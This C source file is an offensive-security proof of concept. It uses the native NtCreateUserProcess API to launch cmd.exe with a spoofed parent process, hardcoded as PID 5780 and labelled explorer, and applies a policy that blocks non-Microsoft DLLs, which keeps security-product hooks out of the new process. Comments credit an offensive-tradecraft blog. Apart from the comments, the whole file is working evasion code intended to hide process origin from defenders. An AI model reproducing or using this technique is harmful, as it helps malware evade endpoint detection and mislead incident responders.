#include <Windows.h>
#include "ntdll.h"
#pragma comment(lib, "ntdll")

// https://offensivedefence.co.uk/posts/ntcreateuserprocess/
// https://twitter.com/CaptMeelo

// block dlls
#define PS_ATTRIBUTE_MITIGATION_OPTIONS_2 PsAttributeValue(PsAttributeMitigationOptions, FALSE, TRUE, FALSE)

int main()
{
	// Path to the image file from which the process will be created
	UNICODE_STRING NtImagePath, currentDirectory, cmdLine;
	RtlInitUnicodeString(&NtImagePath, (PWSTR)L"\\??\\C:\\Windows\\System32\\cmd.exe");
	RtlInitUnicodeString(&currentDirectory, (PWSTR)L"C:\\Users\\Public");
	RtlInitUnicodeString(&cmdLine, (PWSTR)L"\"C:\\Windows\\System32\\cmd.exe -sp00fed\"");

	// PPID Spoofing
	OBJECT_ATTRIBUTES oa;
	InitializeObjectAttributes(&oa, 0, 0, 0, 0);
	CLIENT_ID cid = { (HANDLE)5780, NULL }; // 5780 = explorer PID
	HANDLE hParent = NULL;
	NtOpenProcess(&hParent, PROCESS_ALL_ACCESS, &oa, &cid);

	// Create the process parameters
	PRTL_USER_PROCESS_PARAMETERS ProcessParameters = NULL;
	RtlCreateProcessParametersEx(&ProcessParameters, &NtImagePath, NULL, &currentDirectory, &cmdLine, NULL, NULL, NULL, NULL, NULL, RTL_USER_PROCESS_PARAMETERS_NORMALIZED);

	// Initialize the PS_CREATE_INFO structure
	PS_CREATE_INFO CreateInfo = { 0 };
	CreateInfo.Size = sizeof(CreateInfo);
	CreateInfo.State = PsCreateInitialState;

	// Initialize the PS_ATTRIBUTE_LIST structure
	PPS_ATTRIBUTE_LIST AttributeList = (PS_ATTRIBUTE_LIST*)RtlAllocateHeap(RtlProcessHeap(), HEAP_ZERO_MEMORY, 3 * sizeof(PS_ATTRIBUTE));
	AttributeList->TotalLength = sizeof(PS_ATTRIBUTE_LIST);
	AttributeList->Attributes[0].Attribute = PS_ATTRIBUTE_IMAGE_NAME;
	AttributeList->Attributes[0].Size = NtImagePath.Length;
	AttributeList->Attributes[0].Value = (ULONG_PTR)NtImagePath.Buffer;
	// PPID Spoofing
	AttributeList->Attributes[1].Attribute = PS_ATTRIBUTE_PARENT_PROCESS;
	AttributeList->Attributes[1].Size = sizeof(HANDLE);
	AttributeList->Attributes[1].ValuePtr = hParent;
	// Block DLLs
	DWORD64 policy = PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON;
	AttributeList->Attributes[2].Attribute = PS_ATTRIBUTE_MITIGATION_OPTIONS_2;
	AttributeList->Attributes[2].Size = sizeof(DWORD64);
	AttributeList->Attributes[2].ValuePtr = &policy;

	// Create the process
	HANDLE hProcess, hThread = NULL;
	NtCreateUserProcess(&hProcess, &hThread, PROCESS_ALL_ACCESS, THREAD_ALL_ACCESS, NULL, NULL, NULL, NULL, ProcessParameters, &CreateInfo, AttributeList);

	// Clean up
	RtlFreeHeap(RtlProcessHeap(), 0, AttributeList);
	RtlDestroyProcessParameters(ProcessParameters);
}